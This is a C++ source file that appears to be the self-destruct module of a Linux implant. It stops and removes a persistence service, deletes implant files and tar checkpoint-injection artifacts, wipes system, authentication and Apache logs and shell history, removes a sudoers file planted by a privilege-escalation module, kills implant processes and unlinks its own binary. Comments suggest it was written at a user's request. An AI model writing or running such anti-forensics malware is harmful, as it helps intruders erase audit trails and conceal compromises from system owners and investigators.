#include "self_destruct.h"
#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>

namespace fs = std::filesystem;

/**
 * Executes a shell command and ignores the output.
 */
static void run_command(const std::string& cmd) {
    system((cmd + " > /dev/null 2>&1").c_str());
}

/**
 * Removes the sudoers file created by the privesc module.
 */
static void cleanup_sudoers() {
    const std::string sudoers_file = "/etc/sudoers.d/daemon";
    try {
        if (fs::exists(sudoers_file)) {
            fs::remove(sudoers_file);
        }
    } catch (...) {
        // Ignore errors
    }
}
/**
 * Kills processes by name, avoiding killing the current process.
 */
static void kill_processes() {
    std::vector<std::string> process_names = {
        "systemd-private-uptime",
        "systemd-private-update",
        "user.json",
        "implant"
    };


    pid_t my_pid = getpid();
    std::string my_pid_str = std::to_string(my_pid);

    for (const auto& name : process_names) {
        // Use pkill with exclusion of our own PID if possible, 
        // or just rely on the fact that pkill sends signals to all matches.
        // To be safe, we use a command that excludes our PID.
        std::string cmd = "pgrep -x " + name + " | grep -v ^" + my_pid_str + "$ | xargs -r kill -9";
        run_command(cmd);
    }
}

void self_destruct() {
    // 1. Stop and disable the persistence service
    run_command("systemctl stop private");
    run_command("systemctl disable private");
    run_command("systemctl daemon-reload");

    // 2. Remove the service file and logs
    std::vector<std::string> files_to_remove = {
        "/etc/systemd/system/private.service",
        "/tmp/systemd-private-uptime",
        "/tmp/systemd-private-update",
        "/tmp/index.html",
        "/tmp/.k",
        "/tmp/.font-unix-s",
        "/tmp/.font-unix-d",
        "/tmp/backups/tests.sh",
        "/tmp/backups/--checkpoint=1",
        "/tmp/backups/--checkpoint-action=exec=sh tests.sh",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/root/.bash_history"
    };

    for (const auto& file : files_to_remove) {
        try {
            if (fs::exists(file)) {
                // For logs, sometimes it's better to truncate, but user asked to delete.
                // We'll try to truncate first to be less disruptive to the system logging daemon if it's holding the handle, 
                // but then remove if possible.
                std::ofstream ofs(file, std::ios::trunc);
                ofs.close();
                fs::remove(file);
            }
        } catch (...) {}
    }

    // 2.1 Clear shell history
    run_command("history -c && history -w");
    run_command("cat /dev/null > ~/.bash_history && history -c");

    // 3. Remove directories
    std::vector<std::string> dirs_to_remove = {
        // "/tmp/backups" - User requested not to remove this folder
    };

    for (const auto& dir : dirs_to_remove) {
        try {
            if (fs::exists(dir)) {
                fs::remove_all(dir);
            }
        } catch (...) {}
    }

    // 4. Cleanup sudoers modifications
    cleanup_sudoers();

    // 5. Cleanup LVM escape artifacts
    run_command("umount /var/tmp/.system-cache");
    try {
        if (fs::exists("/var/tmp/.system-cache")) {
            fs::remove_all("/var/tmp/.system-cache");
        }
    } catch (...) {}

    // 6. Kill other associated processes
    // We do this before self-deletion to ensure we don't kill ourselves prematurely
    // if we share a name, but pkill -9 might be risky if we match.
    // However, the requirement says "After deleting the implant files, kill the processes too."
    kill_processes();

    // 7. Self-delete the currently running executable
    // This is a common trick to remove the binary while it's still running.
    unlink("/proc/self/exe");

    // Final exit
    exit(0);
}
